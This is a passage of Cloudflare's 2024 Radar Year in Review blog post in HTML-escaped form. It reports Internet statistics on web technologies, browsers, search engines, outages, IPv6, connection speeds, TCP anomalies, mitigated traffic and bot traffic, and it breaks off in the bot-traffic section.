            &lt;h3&gt;React, PHP, and jQuery were among the most popular technologies used to build websites, while Hubspot, Google, and WordPress were among the most popular vendors of supporting services and platforms.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#react-php-and-jquery-were-among-the-most-popular-technologies-used-to-build-websites-while-hubspot-google-and-wordpress-were-among-the-most-popular-vendors-of-supporting-services-and-platforms"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Modern websites and applications are extremely complex, built on and integrating on a mix of frameworks, platforms, services, and tools. In order to deliver a seamless user experience, developers must ensure that all of these components happily coexist with each other. Using &lt;a href="https://radar.cloudflare.com/scan"&gt;&lt;u&gt;Cloudflare Radar’s URL Scanner&lt;/u&gt;&lt;/a&gt;, we again scanned websites associated with the &lt;a href="https://radar.cloudflare.com/domains"&gt;&lt;u&gt;top 5000 domains&lt;/u&gt;&lt;/a&gt; to identify the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#website-technologies"&gt;&lt;u&gt;most popular technologies and services&lt;/u&gt;&lt;/a&gt; used across a dozen different categories. &lt;/p&gt;&lt;p&gt;In looking at core technologies used to build websites, &lt;a href="https://react.dev/"&gt;&lt;u&gt;React&lt;/u&gt;&lt;/a&gt; had a commanding lead over &lt;a href="https://vuejs.org/"&gt;&lt;u&gt;Vue.js&lt;/u&gt;&lt;/a&gt; and other JavaScript frameworks, &lt;a href="https://www.php.net/"&gt;&lt;u&gt;PHP&lt;/u&gt;&lt;/a&gt; was the most popular programming technology, and &lt;a href="https://jquery.com/"&gt;&lt;u&gt;jQuery&lt;/u&gt;&lt;/a&gt;’s share was 10x other popular JavaScript libraries.&lt;/p&gt;&lt;p&gt;Third-party services and platforms are also used by websites and applications to support things like analytics, content management, and marketing automation. Google Analytics remained the most widely used analytics provider, WordPress had a greater than 50% share among content management systems, and for marketing automation providers, category leader HubSpot had nearly twice the usage share of Marketo and MailChimp.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2fJS1OpqRlVCsZ9VOXdU89/c01320ff9d20da4ad2471de780a86033/adoption_-_top_website_technologies.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Top website technologies, JavaScript frameworks category in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Go surpassed NodeJS as the most popular language used for making automated API requests.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#go-surpassed-nodejs-as-the-most-popular-language-used-for-making-automated-api-requests"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Many dynamic websites and applications are built on &lt;a href="https://blog.cloudflare.com/2024-api-security-report/"&gt;&lt;u&gt;automated API calls&lt;/u&gt;&lt;/a&gt;, and we can use our unique visibility into Web traffic to identify the top languages these API clients are written in. Applying heuristics to API-related requests determined to not be coming from a person using a browser or native mobile application helps us to identify the language used to build the API client.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#api-client-language-popularity"&gt;&lt;u&gt;Our analysis&lt;/u&gt;&lt;/a&gt; found that almost 12% of automated API requests are made by &lt;a href="https://go.dev/"&gt;&lt;u&gt;Go&lt;/u&gt;&lt;/a&gt;-based clients, with &lt;a href="https://nodejs.org/en/"&gt;&lt;u&gt;NodeJS&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.python.org/"&gt;&lt;u&gt;Python&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.java.com/"&gt;&lt;u&gt;Java&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://dotnet.microsoft.com/"&gt;&lt;u&gt;.NET&lt;/u&gt;&lt;/a&gt; holding smaller shares. Compared to &lt;a href="https://radar.cloudflare.com/year-in-review/2023#api-client-language-popularity"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;, Go’s share increased by approximately 40%, allowing it to capture the top spot, while NodeJS’s share fell by just over 30%. Python and Java also saw their shares increase, while .NET’s fell.&lt;/p&gt;
          &lt;figure&gt;

            &lt;h3&gt;Google is the most popular search engine globally, across all platforms. On mobile devices/OS, Baidu is a distant second. Bing is a distant second across desktop and Windows devices, with DuckDuckGo second most popular on macOS. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-is-the-most-popular-search-engine-globally-across-all-platforms-on-mobile-devices-os-baidu-is-a-distant-second-bing-is-a-distant-second-across-desktop-and-windows-devices-with-duckduckgo-second-most-popular-on-macos"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Protecting and accelerating websites and applications for millions of customers, Cloudflare is in a unique position to measure search engine market share data. Our methodology uses HTTP’s &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer"&gt;&lt;u&gt;referer header&lt;/u&gt;&lt;/a&gt; to identify the search engine sending traffic to customer sites and applications. The market share data is presented as an overall aggregate, as well as broken out by device type and operating system. (Device type and operating system data is derived from the &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"&gt;&lt;u&gt;User-Agent&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Client_hints"&gt;&lt;u&gt;Client Hints&lt;/u&gt;&lt;/a&gt; headers accompanying a content request.)&lt;/p&gt;&lt;p&gt;Aggregated at a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#search-engine-market-share"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, Google referred the most traffic to Cloudflare customers, with a greater than 88% share across 2024. Yandex, Baidu, Bing, and DuckDuckGo round out the top five, all with single digit percentage shares. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7bwTSu9NktZ9chotEmTQhs/fd231b3f13fe4709ca7480546276d2e0/adoption_-_search_engine_overall_worldwide.png" /&gt;

For example, in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/kr#search-engine-market-share"&gt;&lt;u&gt;South Korea&lt;/u&gt;&lt;/a&gt;, Google is responsible for only two-thirds of referrals, while local platform &lt;a href="https://www.naver.com/"&gt;&lt;u&gt;Naver&lt;/u&gt;&lt;/a&gt; drives 29.2%, with local portal &lt;a href="https://www.daum.net/"&gt;&lt;u&gt;Daum&lt;/u&gt;&lt;/a&gt; also in the top five at 1.3%.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Overall search engine market share in South Korea in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Google’s dominance is also blunted a bit on Windows devices, where it drives only 80% of referrals globally. Unsurprisingly, Bing holds the second spot for Windows users, with a 10.4% share. Yandex, Yahoo, and DuckDuckGo round out the top 5, all with shares below 5%.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Overall worldwide search engine market share for Windows devices in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;For additional details, including search engines aggregated under “Other”, please refer to the quarterly &lt;a href="https://radar.cloudflare.com/reports/search-engines"&gt;&lt;u&gt;Search Engine Referral Reports&lt;/u&gt;&lt;/a&gt; on Cloudflare Radar.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Google Chrome is the most popular browser overall. While also true on MacOS devices, Safari usage is well ahead of Chrome on iOS devices. On Windows, Edge is the second most popular browser. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-chrome-is-the-most-popular-browser-overall-while-also-true-on-macos-devices-safari-usage-is-well-ahead-of-chrome-on-ios-devices-on-windows-edge-is-the-second-most-popular-browser"&gt;

          &lt;/div&gt;
        &lt;p&gt;Similar to our ability to measure search engine market share, Cloudflare is also in a unique position to measure browser market share. Our methodology uses information from the &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"&gt;&lt;u&gt;User-Agent&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Client_hints"&gt;&lt;u&gt;Client Hints&lt;/u&gt;&lt;/a&gt; headers to identify the browser making content requests, along with the associated operating system. Browser market share data is presented as an overall aggregate, as well as broken out by device type and operating system. Note that the shares of browsers available on both desktop and mobile devices, such as Chrome or Safari, are presented in aggregate.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#browser-market-share"&gt;&lt;u&gt;Globally&lt;/u&gt;&lt;/a&gt;, we found that 65.8% of requests came from Google’s Chrome browser across 2024, and that just 15.5% came from Apple’s Safari browser. Microsoft Edge, Mozilla Firefox, and the &lt;a href="https://www.samsung.com/us/support/owners/app/samsung-internet"&gt;&lt;u&gt;Samsung Internet browser&lt;/u&gt;&lt;/a&gt; rounded out the top five, all with shares below 10%.&lt;/p&gt;

In some countries where iOS holds a larger market share than Android, Chrome remains the leading browser, but by a much lower margin. For example, in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/se#browser-market-share"&gt;&lt;u&gt;Sweden&lt;/u&gt;&lt;/a&gt;, Chrome’s share fell to 56.2%, while Safari’s increased to 22.5%. In &lt;a href="https://radar.cloudflare.com/year-in-review/2024/no#browser-market-share"&gt;&lt;u&gt;Norway&lt;/u&gt;&lt;/a&gt;, Chrome fell to just 50%, while Safari grew to 25.6%.&lt;/p&gt;

            &lt;h3&gt;225 major Internet outages were observed around the world in 2024, with many due to government-directed regional and national shutdowns of Internet connectivity.&lt;/h3&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Throughout 2024, as we have over the last several years, we have written frequently about observed Internet outages, whether due to &lt;a href="https://blog.cloudflare.com/east-african-internet-connectivity-again-impacted-by-submarine-cable-cuts"&gt;&lt;u&gt;cable cuts&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/impact-of-verizons-september-30-outage-on-internet-traffic/"&gt;&lt;u&gt;unspecified technical issues&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/syria-iraq-algeria-exam-internet-shutdown"&gt;&lt;u&gt;government-directed shutdowns&lt;/u&gt;&lt;/a&gt;, or a number of other reasons covered in our quarterly summary posts (&lt;a href="https://blog.cloudflare.com/q1-2024-internet-disruption-summary"&gt;&lt;u&gt;Q1&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/q2-2024-internet-disruption-summary"&gt;&lt;u&gt;Q2&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary"&gt;&lt;u&gt;Q3&lt;/u&gt;&lt;/a&gt;). The impacts of these outages can be significant, including significant economic losses and severely limited communications. The &lt;a href="https://radar.cloudflare.com/outage-center"&gt;&lt;u&gt;Cloudflare Radar Outage Center&lt;/u&gt;&lt;/a&gt; tracks these Internet outages, and uses Cloudflare traffic data for insights into their scope and duration.&lt;/p&gt;&lt;p&gt;Some of the outages seen through the year were short-lived, lasting just a few hours, while others stretched on for days or weeks. In the latter category, an Internet outage in &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#haiti"&gt;&lt;u&gt;Haiti&lt;/u&gt;&lt;/a&gt; dragged on for eight days in September because repair crews were barred from accessing a damaged submarine cable due to a business dispute, while shutdowns of mobile and fixed Internet providers in &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#bangladesh"&gt;&lt;u&gt;Bangladesh&lt;/u&gt;&lt;/a&gt; lasted for approximately 10 days in July. In the former category, &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#iraqi-kurdistan"&gt;&lt;u&gt;Iraq&lt;/u&gt;&lt;/a&gt; frequently experienced multi-hour nationwide Internet shutdowns intended to prevent cheating on academic exams — these contribute to the clustering visible in the timeline during June, July, August, and September.&lt;/p&gt;&lt;p&gt;Within the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-outages"&gt;&lt;u&gt;timeline&lt;/u&gt;&lt;/a&gt; on the Year in Review microsite, hovering over a dot will display metadata about that outage, and clicking on it will open a page with additional information.

            &lt;h3&gt;Aggregated across 2024, 28.5% of IPv6-capable requests were made over IPv6. India and Malaysia were the strongest countries, at 68.9% and 59.6% IPv6 adoption respectively.&lt;/h3&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The IPv4 protocol still used by many Internet-connected devices was developed in the 1970s, and was never meant to handle the vast and growing scale of the modern Internet. An &lt;a href="https://www.rfc-editor.org/rfc/rfc1883"&gt;&lt;u&gt;initial specification for its successor&lt;/u&gt;&lt;/a&gt;, IPv6, was published in December 1995, evolving to a &lt;a href="https://www.rfc-editor.org/rfc/rfc2460"&gt;&lt;u&gt;draft standard&lt;/u&gt;&lt;/a&gt; three years later, offering an expanded address space intended to better support the expected growth in the number of Internet-connected devices. At this point, available IPv4 space has long since been &lt;a href="https://ipv4.potaroo.net/"&gt;&lt;u&gt;exhausted&lt;/u&gt;&lt;/a&gt;, and connectivity providers use solutions like &lt;a href="https://en.wikipedia.org/wiki/Network_address_translation"&gt;&lt;u&gt;Network Address Translation&lt;/u&gt;&lt;/a&gt; to stretch limited IPv4 resources. Hungry for IPv4 address space as their businesses and infrastructure grow, cloud and hosting providers are acquiring blocks of IPv4 address space for &lt;a href="https://auctions.ipv4.global/"&gt;&lt;u&gt;as much as \$30 - \$50 per address&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;Cloudflare has been a vocal and active advocate for IPv6 since 2011, when we announced our &lt;a href="https://blog.cloudflare.com/introducing-cloudflares-automatic-ipv6-gatewa/"&gt;&lt;u&gt;Automatic IPv6 Gateway&lt;/u&gt;&lt;/a&gt;, which enabled free IPv6 support for all of our customers. In 2014, we enabled &lt;a href="https://blog.cloudflare.com/i-joined-cloudflare-on-monday-along-with-5-000-others"&gt;&lt;u&gt;IPv6 support by default for all of our customers&lt;/u&gt;&lt;/a&gt;, but not all customers choose to keep it enabled for a variety of reasons. Note that server-side support is only half of the equation for driving IPv6 adoption, as end user connections need to support it as well. (In reality, it is a bit more complex than that, but server and client side support across applications, operating systems, and network environments are the two primary requirements. From a network perspective, implementing IPv6 also brings a number of other &lt;a href="https://www.catchpoint.com/benefits-of-ipv6"&gt;&lt;u&gt;benefits&lt;/u&gt;&lt;/a&gt;.) By analyzing the IP version used for each request made to Cloudflare, aggregated throughout the year, we can get insight into the distribution of traffic by the various versions of the protocol.&lt;/p&gt;&lt;p&gt;At a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#ipv6-adoption"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, 28.5% of IPv6-capable (“&lt;a href="https://www.techopedia.com/definition/19025/dual-stack-network"&gt;&lt;u&gt;dual-stack&lt;/u&gt;&lt;/a&gt;”) requests were made over IPv6, up from 26.4% in &lt;a href="https://radar.cloudflare.com/year-in-review/2024?previousYear=true"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://radar.cloudflare.com/year-in-review/2024/in#ipv6-adoption"&gt;&lt;u&gt;India&lt;/u&gt;&lt;/a&gt; was again the country with the highest level of IPv6 adoption, at 68.9%, carried in large part by &lt;a href="https://radar.cloudflare.com/adoption-and-usage/as55836?dateStart=2024-01-01&amp;amp;dateEnd=2024-12-01"&gt;&lt;u&gt;94% IPv6 adoption at Reliance Jio&lt;/u&gt;&lt;/a&gt;, one of the country’s largest Internet service providers. India was followed closely by &lt;a href="https://radar.cloudflare.com/year-in-review/2024/my#ipv6-adoption"&gt;&lt;u&gt;Malaysia&lt;/u&gt;&lt;/a&gt;, where 59.6% of dual-stacked requests were made over IPv6 during 2024, thanks to &lt;a href="https://radar.cloudflare.com/explorer?dataSet=http&amp;amp;groupBy=ases&amp;amp;loc=MY&amp;amp;dt=14d&amp;amp;metric=ip_version%2FIPv6"&gt;&lt;u&gt;strong IPv6 adoption rates across leading Internet providers&lt;/u&gt;&lt;/a&gt; within the country. IPv6 adoption in India was up from 66% in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/in?previousYear=true#ipv6-adoption"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;, and in Malaysia, it was up from 57.3% &lt;a href="https://radar.cloudflare.com/year-in-review/2024/my?previousYear=true#ipv6-adoption"&gt;&lt;u&gt;last year&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sa#ipv6-adoption"&gt;&lt;u&gt;Saudi Arabia&lt;/u&gt;&lt;/a&gt; was the only other country with an IPv6 adoption rate above 50% this year, at 51.8%, whereas that list also included &lt;a href="https://radar.cloudflare.com/year-in-review/2023/vn#ipv6-adoption"&gt;&lt;u&gt;Vietnam&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2023/gr#ipv6-adoption"&gt;&lt;u&gt;Greece&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2023/fr#ipv6-adoption"&gt;&lt;u&gt;France&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2023/uy#ipv6-adoption"&gt;&lt;u&gt;Uruguay&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2023/th#ipv6-adoption"&gt;&lt;u&gt;Thailand&lt;/u&gt;&lt;/a&gt; in 2023. Thirty four countries/regions, including many in Africa, still have IPv6 adoption rates below 1%, while a total of 96 countries/regions have adoption rates below 10%.&lt;/p&gt;

            &lt;h3&gt;The top 10 countries ranked by Internet speed all had average download speeds above 200 Mbps. Spain was consistently among the top locations across measured Internet quality metrics.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-top-10-countries-ranked-by-internet-speed-all-had-average-download-speeds-above-200-mbps-spain-was-consistently-among-the-top-locations-across-measured-internet-quality-metrics"&gt;

          &lt;/div&gt;
        &lt;p&gt;As more and more of our everyday lives move online, including entertainment, work, education, finance, shopping, and even basic social and personal interaction, the quality of our Internet connections is arguably more important than ever, necessitating higher connection speeds and lower latency. Although Internet providers continue to evolve their service portfolios to offer increased connection speeds and reduced latency in order to support growth in use cases like videoconferencing, live streaming, and online gaming, consumer adoption is often mixed due to cost, availability, or other issues. By aggregating the results of &lt;a href="https://speed.cloudflare.com/"&gt;&lt;u&gt;speed.cloudflare.com&lt;/u&gt;&lt;/a&gt; tests taken during 2024, we can get a geographic perspective on &lt;a href="https://developers.cloudflare.com/radar/glossary/#connection-quality"&gt;&lt;u&gt;connection quality&lt;/u&gt;&lt;/a&gt; metrics including average download and upload speeds, and average idle and loaded latencies, as well as the distribution of the measurements.&lt;/p&gt;&lt;p&gt;In &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-quality"&gt;&lt;u&gt;2024&lt;/u&gt;&lt;/a&gt;, Spain was a leader in download speed (292.6 Mbps) and upload speed (192.6 Mbps) metrics, and placed second globally for loaded latency (78.6 ms). (Loaded latency is the round-trip time when data-heavy applications are being used on the network.) Spain’s leadership in these connection quality metrics is supported by the strong progress that the country has made &lt;a href="https://ec.europa.eu/newsroom/dae/redirection/document/106695"&gt;&lt;u&gt;towards achieving the EU’s “Digital Decade” objectives&lt;/u&gt;&lt;/a&gt;, including fixed very high capacity network (VHCN) deployment, fiber-to-the-premises (FTTP) coverage, and 5G coverage with the latter two &lt;a href="https://www.trade.gov/country-commercial-guides/spain-digital-economy"&gt;&lt;u&gt;reaching&lt;/u&gt;&lt;/a&gt; 95.2% and 92.3% respectively. High speed fiber broadband connections are also relatively affordable, with research showing major providers offering 100 Mbps, 300 Mbps, 600 Mbps, and 1 Gbps packages, with the latter priced between €30 and €46 per month. The figures below for &lt;a href="https://radar.cloudflare.com/year-in-review/2024/es#internet-quality"&gt;&lt;u&gt;Spain&lt;/u&gt;&lt;/a&gt; show the largest clusters of speed measurements around the 100 Mbps mark, with slight bumps also visible around 300 Mbps, suggesting that the former package has the highest subscription rate, followed by the latter. Further, they show these connections are also relatively low latency, with 87% of idle latency measurements below 50 ms and 65% of loaded latency measurements below 100 ms, providing users with good &lt;a href="https://www.screenbeam.com/wifihelp/wifibooster/how-to-reduce-latency-or-lag-in-gaming-2/#:~:text=Latency%20is%20measured%20in%20milliseconds,%2C%2020%2D40ms%20is%20optimal."&gt;&lt;u&gt;gaming&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.haivision.com/glossary/video-latency/#:~:text=Low%20latency%20is%20typically%20defined,and%20streaming%20previously%20recorded%20events."&gt;&lt;u&gt;videoconferencing/streaming&lt;/u&gt;&lt;/a&gt; experiences.&lt;/p&gt;

        &lt;p&gt;With approximately &lt;a href="https://www.statista.com/topics/840/smartphones/#topicOverview"&gt;&lt;u&gt;70% of the world’s population using smartphones&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://www.pewresearch.org/internet/fact-sheet/mobile/"&gt;&lt;u&gt;91% of Americans owning a smartphone&lt;/u&gt;&lt;/a&gt;, these mobile devices have become an integral part of both our personal and professional lives, providing us with Internet access from nearly any place at any time. In some countries/regions, mobile devices primarily connect to the Internet via Wi-Fi, while other countries/regions are “mobile first”, where 4G/5G services are the primary means of Internet access.&lt;/p&gt;&lt;p&gt;Analysis of information contained with the user agent reported with each request to Cloudflare enables us to categorize it as coming from a mobile, desktop, or other type of device. Aggregating this categorization throughout the year at a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#mobile-vs-desktop"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, we found that 41.3% of traffic came from mobile devices, with 58.7% coming from desktop devices such as laptops and “classic” PCs. These traffic shares were in line with those measured in both &lt;a href="https://radar.cloudflare.com/year-in-review/2023#mobile-vs-desktop"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt; and 2022, suggesting that mobile device usage has achieved a “steady state”. Over 77% of traffic came from mobile devices in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sd#mobile-vs-desktop"&gt;&lt;u&gt;Sudan&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cu#mobile-vs-desktop"&gt;&lt;u&gt;Cuba&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sy#mobile-vs-desktop"&gt;&lt;u&gt;Syria&lt;/u&gt;&lt;/a&gt;, making them the countries/regions with the largest mobile device traffic share in 2024. Other countries/regions that had more than 50% of traffic come from mobile devices were concentrated in the Middle East/Africa, the Asia Pacific region, and South/Central America. &lt;/p&gt;

            &lt;h3&gt;20.7% of TCP connections are unexpectedly terminated before any useful data can be exchanged.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#20-7-of-tcp-connections-are-unexpectedly-terminated-before-any-useful-data-can-be-exchanged"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare is in a unique position to help measure the health and behaviors of Internet networks around the world. One way we do this is passively measuring rates of connections to Cloudflare that appear &lt;i&gt;anomalous&lt;/i&gt;, meaning that they are unexpectedly terminated before any useful data exchange occurs. The underlying causes of connection anomalies are varied and range from DoS attacks to quirky client behavior to third-party connection tampering (e.g., when a network monitors and selectively disrupts connections to filter content).&lt;/p&gt;&lt;p&gt;Connection anomalies are symptoms — visible signs that “something abnormal” is happening in a network, but the underlying root cause is not always clear from the outset. However, we can gain a better understanding by incorporating previously-reported network behaviors, active measurements and on-the-ground reports, and macro trends across networks. Additional details on such analysis can be found in the blog posts &lt;a href="https://blog.cloudflare.com/connection-tampering/"&gt;&lt;i&gt;&lt;u&gt;A global assessment of third-party connection tampering&lt;/u&gt;&lt;/i&gt;&lt;/a&gt; and&lt;a href="https://blog.cloudflare.com/tcp-resets-timeouts/"&gt; &lt;i&gt;&lt;u&gt;Bringing insights into TCP resets and timeouts to Cloudflare Radar&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Insights into TCP connection anomalies were &lt;a href="https://blog.cloudflare.com/tcp-resets-timeouts/"&gt;&lt;u&gt;launched on Cloudflare Radar&lt;/u&gt;&lt;/a&gt; in September, with the plot lines in the associated graph corresponding to the stage of the TCP connection in which the connection anomalously closed (using shorthand, the first three messages we typically receive from the client in a TCP connection are “SYN” and “ACK” packets to establish a connection, and then a “PSH” packet indicating the requested resource). In aggregate &lt;a href="https://radar.cloudflare.com/year-in-review/2024#tcp-connection-anomalies"&gt;&lt;u&gt;globally&lt;/u&gt;&lt;/a&gt;, over 20% of connections to Cloudflare were terminated unexpectedly, with the largest share (nearly half) being closed “Post SYN” — that is, after our server has received a client’s SYN packet, but before we have received a subsequent acknowledgement (ACK) from the client or any useful data that would follow the acknowledgement. These terminations can often be attributed to DoS attacks or Internet scanning. Post-ACK (3.1% globally) and Post-PSH (1.4% globally) anomalies are more often associated with connection tampering, especially when they occur at high rates in specific networks.&lt;/p&gt;

            &lt;h3&gt;6.5% of global traffic was mitigated by Cloudflare's systems as being potentially malicious or for customer-defined reasons.&lt;/h3&gt;

          &lt;/div&gt;
        &lt;p&gt;To &lt;a href="https://www.cloudflare.com/products/zero-trust/threat-defense/"&gt;&lt;u&gt;protect customers from threats&lt;/u&gt;&lt;/a&gt; posed by malicious bots used to attack websites and applications, Cloudflare mitigates this attack traffic using &lt;a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/"&gt;&lt;u&gt;DDoS&lt;/u&gt;&lt;/a&gt; mitigation techniques or &lt;a href="https://developers.cloudflare.com/waf/managed-rules/"&gt;&lt;u&gt;Web Application Firewall (WAF) Managed Rules&lt;/u&gt;&lt;/a&gt;. For a variety of other reasons, customers may also want Cloudflare to mitigate traffic using techniques like &lt;a href="https://developers.cloudflare.com/waf/rate-limiting-rules/"&gt;&lt;u&gt;rate-limiting&lt;/u&gt;&lt;/a&gt; requests, or &lt;a href="https://developers.cloudflare.com/waf/tools/ip-access-rules/"&gt;&lt;u&gt;blocking all traffic from a given location&lt;/u&gt;&lt;/a&gt;, even if it isn’t malicious. Analyzing traffic to Cloudflare’s network throughout 2024, we looked at the overall share that was mitigated for any reason, as well as the share that was blocked as a DDoS attack or by WAF Managed Rules. &lt;/p&gt;&lt;p&gt;In 2024, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#mitigated-traffic"&gt;&lt;u&gt;6.5% of global traffic was mitigated&lt;/u&gt;&lt;/a&gt;, up almost one percentage point from &lt;a href="https://radar.cloudflare.com/year-in-review/2023#mitigated-traffic"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;. Just 3.2% was mitigated as a DDoS attack, or by WAF Managed Rules, a rate slightly higher than in 2023. More than 10% of the traffic originating from 44 countries/regions had mitigations generally applied, while DDoS/WAF mitigations were applied to more than 10% of the traffic originating from just seven countries/regions.&lt;/p&gt;&lt;p&gt;At a country/region level, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/al#mitigated-traffic"&gt;&lt;u&gt;Albania&lt;/u&gt;&lt;/a&gt; had one of the highest mitigated traffic shares throughout the year, at 42.9%, while &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ly#mitigated-traffic"&gt;&lt;u&gt;Libya&lt;/u&gt;&lt;/a&gt; had one of the highest shares of traffic that was mitigated as a DDoS attack or by WAF Managed Rules, at 19.2%. In &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/#just-under-6-of-global-traffic-was-mitigated-by-cloudflares-systems-as-being-potentially-malicious-or-for-customer-defined-reasons-in-the-united-states-3-65-of-traffic-was-mitigated-while-in-south-korea-it-was-8-36"&gt;&lt;u&gt;2023’s Year in Review blog post&lt;/u&gt;&lt;/a&gt;, we highlighted the United States and Korea. This year, the share of mitigated traffic grew to 5.0% in the &lt;a href="https://radar.cloudflare.com/year-in-review/2024/us#mitigated-traffic"&gt;&lt;u&gt;United States&lt;/u&gt;&lt;/a&gt; (up from 3.65% in 2023), while in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/kr#mitigated-traffic"&gt;&lt;u&gt;South Korea&lt;/u&gt;&lt;/a&gt;, it dropped slightly to 8.1%, down from 8.36%.&lt;/p&gt;

            &lt;h3&gt;The United States was responsible for over a third of global bot traffic. Amazon Web Services was responsible for 12.7% of global bot traffic, and 7.8% came from Google.&lt;/h3&gt;

        &lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/bots/what-is-a-bot/"&gt;&lt;u&gt;Bot&lt;/u&gt;&lt;/a&gt; traffic describes any non-human Internet traffic, and by monitoring traffic suspected to be from bots site and application owners can spot and, if necessary, block potentially malicious activity. However, not all bots are malicious — bots can also be helpful, and Cloudflare maintains a list of &lt;a href="https://radar.cloudflare.com/traffic/verified-bots"&gt;&lt;u&gt;verified bots&lt;/u&gt;&lt;/a&gt; that includes those used for things like search engine indexing, performance testing, and &lt;a href="https://www.cloudflare.com/application-services/solutions/app-performance-monitoring/"&gt;&lt;u&gt;availability monitoring&lt;/u&gt;&lt;/a&gt;. Regardless of intent, we analyzed where bot traffic was originating from in 2024, using the IP address of a request to identify the network (&lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/"&gt;&lt;u&gt;autonomous system&lt;/u&gt;&lt;/a&gt;) and country/region associated with the bot making the request. Cloud platforms remained among the leading sources of bot traffic due to a number of factors. These include the ease of using automated tools to quickly provision compute resources, the relatively low cost of using these compute resources in an ephemeral manner, the broadly distributed geographic footprint of cloud platforms, and the platforms’ high-bandwidth Internet connectivity.&lt;/p&gt;&lt;p&gt;&lt;a 